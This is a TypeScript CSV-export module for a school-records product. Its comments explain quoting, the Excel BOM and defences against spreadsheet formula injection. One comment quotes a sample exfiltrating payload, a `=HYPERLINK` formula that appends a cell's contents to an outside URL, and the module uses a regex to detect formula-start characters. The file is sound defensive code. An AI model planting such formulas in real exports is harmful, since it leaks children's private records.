/**
 * Building a CSV somebody will open in Excel.
 *
 * ---------------------------------------------------------------------------
 * THE QUOTING IS THE OBVIOUS HALF
 * ---------------------------------------------------------------------------
 * A comma, a quote or a newline inside a cell breaks the file, and school data
 * is full of all three — `studentImport.ts` says the same thing from the other
 * direction, where it has to parse them back.
 *
 * ---------------------------------------------------------------------------
 * FORMULA INJECTION IS THE HALF THAT MATTERS
 * ---------------------------------------------------------------------------
 * Excel, Numbers and Google Sheets treat a cell beginning `=`, `+`, `-`, `@`,
 * a tab or a carriage return as a formula and evaluate it on open. So a line
 * typed into a free-text field in this product — a parent's home observation,
 * a teacher's note, the detail on an audit row — becomes code the moment
 * somebody exports it and double-clicks the file.
 *
 * That is not theoretical for a product whose exports exist so families and
 * schools can take records elsewhere. `=HYPERLINK("http://…"&A1,"click")` in
 * an observation would put a child's data one click from leaving, inside a
 * file the school believes it produced itself.
 *
 * The fix is to make the cell text rather than a formula. A leading apostrophe
 * is the conventional way and it is what spreadsheets themselves write; it
 * shows in the formula bar and not in the cell.
 *
 * WHY NOT STRIP THE CHARACTER. Because "-2 hours of sleep" and "=> calmer
 * afterwards" are things people write, and a record that silently drops what
 * somebody wrote about their own child is worse than one with a stray
 * apostrophe in a spreadsheet.
 */

/** Characters a spreadsheet reads as "this cell is a formula". */
const FORMULA_START = /^[=+\-@\t\r]/

/**
 * One cell: quoted, and defused if a spreadsheet would treat it as a formula.
 *
 * Exported because three screens already build their CSV by hand with a local
 * escaper that quotes correctly and guards nothing. Swapping their one line
 * for this gives them the protection without rewriting export code that works
 * on screens no test covers.
 */
export function csvCell(value: unknown): string {
  const text = value === null || value === undefined ? '' : String(value)
  const safe = FORMULA_START.test(text) ? `'${text}` : text
  return `"${safe.replaceAll('"', '""')}"`
}

/**
 * One CSV, quoted and safe to open.
 *
 * The BOM is not decoration. Without it Excel on Windows reads the file as the
 * system codepage, and every name with an accent in it — of which this
 * database has plenty — arrives mangled for the person least able to explain
 * why.
 */
export function toCsv(headers: string[], rows: unknown[][]): string {
  const body = [
    headers.map(csvCell).join(','),
    ...rows.map((r) => r.map(csvCell).join(',')),
  ]
  return `\ufeff${body.join('\r\n')}`
}

/**
 * Hand the file to the browser.
 *
 * Separate from `toCsv` so the string can be tested without a DOM, which is
 * the only reason the two are not one function.
 */
export function downloadCsv(filename: string, csv: string): void {
  const url = URL.createObjectURL(
    new Blob([csv], { type: 'text/csv;charset=utf-8' }),
  )
  const a = document.createElement('a')
  a.href = url
  a.download = filename
  a.click()
  URL.revokeObjectURL(url)
}
